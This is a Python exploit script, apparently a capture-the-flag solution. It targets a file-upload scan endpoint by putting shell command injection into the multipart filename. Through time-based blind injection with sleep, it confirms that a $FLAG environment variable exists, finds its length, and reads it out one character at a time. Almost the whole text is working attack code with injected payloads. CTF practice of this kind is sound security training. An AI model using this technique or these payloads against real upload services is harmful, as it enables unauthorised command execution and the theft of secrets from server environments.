import requests
import string
import time
import sys

URL = "https://7c38e8d7-8053-42dd-8a18-a46abf19fe0b.offsec.m0lecon.it/scan"
SLEEP = 5
THRESHOLD = 4.0

session = requests.Session()
session.get(URL.rsplit("/", 1)[0] + "/", timeout=15)

#The files parameter creates this HTTP body:
# ------WebKitFormBoundary...
#Content-Disposition: form-data; name="specimen"; filename="PAYLOAD"
#Content-Type: text/plain
#
#x
#------WebKitFormBoundary...

#files = {"form_field_name": (filename, file_content, content_type)}

def fire(payload, body=b"x"):
    files = {"specimen": (payload, body, "text/plain")}
    t0 = time.time()
    try:
        r = session.post(URL, files=files, timeout=30, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        print(f"request error: {e}")
        return 99.0, None
    return time.time() - t0, r

def hung(elapsed):
    return elapsed > THRESHOLD


# Sanity
elapsed, _ = fire(f";sleep {SLEEP};#")
print(f"[*] sanity sleep: {elapsed:.2f}s {'HUNG' if hung(elapsed) else 'FAIL'}")
if not hung(elapsed):
    sys.exit("injection not firing")

# $FLAG visible
elapsed, _ = fire(f";[ ${{#FLAG}} -gt 0 ]&&sleep {SLEEP};#")
print(f"[*] $FLAG visible: {elapsed:.2f}s {'HUNG' if hung(elapsed) else 'FAIL'}")
if not hung(elapsed):
    sys.exit("$FLAG not visible")

# Length
flag_len = None
print("[*] probing length...")
for n in range(1, 128):
    elapsed, _ = fire(f";[ ${{#FLAG}} -eq {n} ]&&sleep {SLEEP};#")
    if hung(elapsed):
        flag_len = n
        print(f"    length = {n}")
        break
if flag_len is None:
    sys.exit("length not found")

charset = string.ascii_letters + string.digits + "{}_-.!?@#%+=:,"
flag = ""
print(f"[*] extracting {flag_len} chars (POSIX style)...")
for i in range(flag_len):
    found = None
    for c in charset:
        payload = f";[ x$(echo $FLAG|cut -c{i+1}) = x{c} ]&&sleep {SLEEP};#"
        elapsed, _ = fire(payload)
        if hung(elapsed):
            found = c
            flag += c
            print(f"    [cut {i+1:>2}/{flag_len}] {flag}")
            break
    if found is None:
        print(f"[!] still no match. flag so far: {flag!r}")
        print(f"    charset may be missing the char at position {i}")
        break

print(f"\n[+] FLAG: {flag}")